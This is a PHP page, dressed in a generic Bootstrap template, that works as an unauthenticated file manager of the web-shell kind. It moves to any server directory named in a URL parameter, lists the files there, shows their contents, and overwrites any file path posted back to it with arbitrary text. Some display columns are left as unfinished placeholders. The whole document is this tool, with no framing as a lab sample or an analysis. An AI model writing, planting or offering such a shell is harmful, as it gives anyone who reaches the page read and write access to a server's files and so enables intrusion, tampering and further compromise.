<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<style type="text/css">
  td {
    padding:7px;
  }
  td.s {
    width:1;
  }
  td.f {
    width: 150px;
  }
  div.nav {
    width: 100%;
    overflow: hidden;
    position: fixed;
  }
  .nav {
      width: 80%;
      background: #fff;
      position: fixed;
      top: 0;
      width: 100%;
      z-index: 9;
  }
  @media screen and (max-width: 600px) {
    div.hide {
      display: none;
    }
  }
</style>
<div class="nav">
<nav class="navbar nav navbar-expand-lg navbar-light bg-light">
  <a class="navbar-brand" href="#">HOME</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" id="navbarNavDropdown">
    <ul class="navbar-nav">
      <li class="nav-item">
        <a class="nav-link" href="#">Features</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Pricing</a>
      </li>
      <li class="nav-item dropdown">
        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
          Dropdown link
        </a>
        <div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
          <a class="dropdown-item" href="#">Action</a>
          <a class="dropdown-item" href="#">Another action</a>
          <a class="dropdown-item" href="#">Something else here</a>
        </div>
      </li>
    </ul>
  </div>
</nav>
</div>
<br><br><br>
<div class="container-fluid">
  <div class="card">
    <div class="card-body">
<?php
function alert($msg)
{
    ?>
  <script>
    $(document).ready(function(){
      $("#alert").modal('show');
    });
  </script>
  <div class="modal fade" id="alert" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
          <div style="width:100%;" class="modal-title alert alert-success" role="alert"><?= $msg ?></div>
      </div>
    </div>
  </div>
  <?php
}
if (isset($_GET['x'])) {
    chdir($_GET['x']);
}
if (isset($_POST['edit'])) {
    $handle = fopen($_POST['file'], "w");
    if (fwrite($handle, $_POST['text'])) {
        echo alert("success");
    } else {
        echo "failed";
    }
}
function getfiles($cwd, $type)
{
    $dir = scandir($cwd);
    $result = [];
    foreach ($dir as $key => $value) {
        $current['fullname'] = $cwd . DIRECTORY_SEPARATOR . $value;
        switch ($type) {
            case 'dir':
                if (
                    !is_dir($current['fullname']) ||
                    $value == '.' ||
                    $value == '..'
                ) {
                    continue 2;
                }
                break;
            case 'file':
                if (!is_file($current['fullname'])) {
                    continue 2;
                }
                break;
        }
        $current['name'] = $value;
        $result[] = $current;
    }
    return $result;
}
foreach (getfiles(getcwd(), "dir") as $key => $dir) { ?>
  <div class="row" style="padding:3px;">
    <div class="col-7">
      <a href="?x=<?= $dir['fullname'] ?>"><?= $dir['name'] ?></a>
    </div>
    <div class="col hide">
      <?= filetype($dir['fullname']) ?>
    </div>
    <div class="col hide">
      // permission
    </div>
    <div class="col hide">
      // last update
    </div>
    <div class="col">
      // action
    </div>
  </div>
  <?php }
foreach (getfiles(getcwd(), 'file') as $key => $file) { ?>
  <div class="row" style="padding:3px;">
    <div class="col-7">
      <?= $file['name'] ?>
    </div>
    <div class="col hide">
      // size
    </div>
    <div class="col hide">
      // permission
    </div>
    <div class="col hide">
      // last update
    </div>
    <div class="col">
      <a href='' class="btn btn-primary btn-sm" data-toggle="modal" data-target="#exampleModalCenter<?= $file[
          'fullname'
      ] ?>">
        edit
      </a>
    </div>
  </div>
    <div class="modal fade" id="exampleModalCenter<?= $file[
        'fullname'
    ] ?>" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
      <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title" id="exampleModalLongTitle">EDIT</h5>
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
          </div>
          <form method="post">
          <div class="modal-body">
            <table width="100%">
              <tr>
                <td class="f">
                  Filename
                </td>
                <td class="s"><center>:</center></td>
                <td>
                  <?= $file['name'] ?>
                </td>
              </tr>
              <tr>
                <td class="f">
                  Size
                </td>
                <td class="s"><center>:</center></td>
                <td>
                  <?= "// size" ?>
                </td>
              </tr>
              <tr>
                <td class="f">
                  Last Modif
                </td>
                <td class="s"><center>:</center></td>
                <td>
                  <?= "// last modif" ?>
                </td>
              </tr>
              <tr>
                <td colspan="3">
                  <textarea name="text" class="form-control" style="height:200px;resize:none;"><?= htmlspecialchars(
                      file_get_contents($file['fullname'])
                  ) ?></textarea>
                </td>
              </tr>
              <tr>
                <td colspan="3">
                  <input style="width:100%;" type="submit" name="edit" class="btn btn-primary" value="Save">
                  <input type="hidden" name="file" value="<?= $file[
                      'fullname'
                  ] ?>">
                </td>
              </tr>
            </table>
          </div>
          </form>
        </div>
      </div>
    </div>
  <?php }
?>
</div>
</div>
</div>
